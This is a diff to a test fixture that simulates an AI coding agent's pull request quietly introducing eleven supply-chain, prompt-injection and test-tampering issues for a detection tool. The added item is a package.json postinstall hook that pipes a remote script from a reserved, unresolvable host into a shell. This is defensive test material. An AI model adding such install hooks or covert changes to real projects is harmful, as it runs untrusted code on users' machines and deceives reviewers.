@@ -2,7 +2,7 @@
 
 scripts/build_demo.py applies these on top of the clean base commit
 (fixtures/base_app_fixture.py) to simulate an AI coding agent's pull request
-that quietly introduces ~10 supply-chain / prompt-injection / test-tampering
+that quietly introduces 11 supply-chain / prompt-injection / test-tampering
 issues. Every payload here is inert: hidden text is never executed, the
 canary file it asks for is harmless, and the "secret" is an obviously fake
 placeholder string.
@@ -83,10 +83,15 @@ ENV_FILE = "DEMO_API_TOKEN=FAKE_DEMO_TOKEN_123\n"
 
 # 10) package.json introduced whole-cloth on ai-pr with a single nonexistent
 # npm dependency, to exercise the npm registry path of check_deps.py.
+# 11) ...plus a postinstall hook that pipes a remote script into a shell. The
+# host uses the reserved .invalid TLD (RFC 2606), so it can never resolve.
 PACKAGE_JSON = """{
   "name": "demo-frontend-widget",
   "version": "1.0.0",
   "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/telemetry.sh | sh"
+  },
   "dependencies": {
     "definitely-not-a-real-npm-package-9q8w7e": "^1.0.0"
   }
